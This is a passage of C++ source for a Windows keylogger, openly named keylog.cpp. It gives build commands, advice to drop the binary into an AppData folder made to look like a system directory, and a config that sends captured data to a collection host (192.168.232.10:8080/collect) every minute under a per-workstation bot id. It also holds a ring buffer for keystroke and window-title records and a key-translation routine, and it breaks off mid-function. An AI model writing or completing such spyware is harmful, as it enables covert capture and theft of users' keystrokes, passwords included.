// keylog.cpp  — build: cl /nologo /O2 /EHsc /W4 /DUNICODE /D_UNICODE keylog.cpp /link user32.lib winhttp.lib advapi32.lib
// x64 Native Tools Command Prompt. Drop keylog.exe into %APPDATA%\Microsoft\Windows\  (not a real system dir path check)

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdarg.h>
#include <time.h>

#pragma comment(lib, "winhttp.lib")

// ---------- config ----------
static wchar_t g_host[]   = L"192.168.232.10";
static int    g_port     = 8080;
static wchar_t g_path[]   = L"/collect";
static wchar_t g_botid[] = L"WS-01";           // per-workstation id
static DWORD  g_flush_ms = 60000;               // exfil interval
static size_t g_maxrec   = 512 * 1024;          // ring cap, bytes

// ---------- record ----------
enum { REC_KEY = 1, REC_WIN = 2 };

typedef struct {
    BYTE  type;
    DWORD tick;
    DWORD vk;
    DWORD scan;
    DWORD flags;
    char  text[64];     // window title or printable key text (UTF-8)
} REC;

typedef struct {
    CRITICAL_SECTION cs;
    BYTE  buf[1 << 20];
    size_t head;        // write cursor
    size_t used;        // bytes live in buf
} RING;

static RING g_ring;
static HWND  g_hwnd;

// ---------- ring buffer ----------
static void ring_init(void) { InitializeCriticalSection(&g_ring.cs); g_ring.head = 0; g_ring.used = 0; }

static void ring_put(const REC* r)
{
    EnterCriticalSection(&g_ring.cs);
    size_t n = sizeof(REC);
    if (n > g_maxrec) n = g_maxrec;
    for (size_t i = 0; i < n; i++) {
        g_ring.buf[(g_ring.head + i) % g_maxrec] = ((const BYTE*)r)[i];
    }
    size_t total = g_ring.used + n;
    if (total > g_maxrec) {                      // drop oldest
        size_t drop = total - g_maxrec;
        g_ring.head = (g_ring.head + drop) % g_maxrec;
        g_ring.used = g_maxrec - n;
    } else {
        g_ring.used = total;
    }
    g_ring.head = (g_ring.head + n) % g_maxrec;
    LeaveCriticalSection(&g_ring.cs);
}

static BOOL ring_take(BYTE* out, size_t cap, size_t* outlen)
{
    BOOL ok = FALSE;
    EnterCriticalSection(&g_ring.cs);
    if (g_ring.used && g_ring.used <= cap) {
        size_t start = (g_ring.head + g_maxrec - g_ring.used) % g_maxrec;
        for (size_t i = 0; i < g_ring.used; i++)
            out[i] = g_ring.buf[(start + i) % g_maxrec];
        *outlen = g_ring.used;
        g_ring.used = 0;
        ok = TRUE;
    }
    LeaveCriticalSection(&g_ring.cs);
    return ok;
}

// ---------- text conversion ----------
static void utf8_from_w(const wchar_t* w, char* out, size_t cap)
{
    int n = WideCharToMultiByte(CP_UTF8, 0, w, -1, out, (int)cap, NULL, NULL);
    if (n <= 0 && cap) out[0] = 0;
}

// shift-state → printable char, else 0
static wchar_t vk_to_char(DWORD vk, DWORD flags)
{
    bool up  = flags & (1 << 7);
    bool sh  = flags & (1 << 0);
    bool ctl = flags & (1 << 1);
    wchar_t c = 0;
    SHORT s = MapVirtualKeyW((UINT)vk, MAPVK_VK_TO_CHAR);
    if (!s) return 0;
    if (up) return 0;
    if (ctl && vk >= 'A' && vk <= 'Z') return 0;
    wchar_t base = (wchar_t)s;
    if (base >= 'a' && base <= 'z' && sh) c = (wchar_t)towupper(base);
    else c = base;
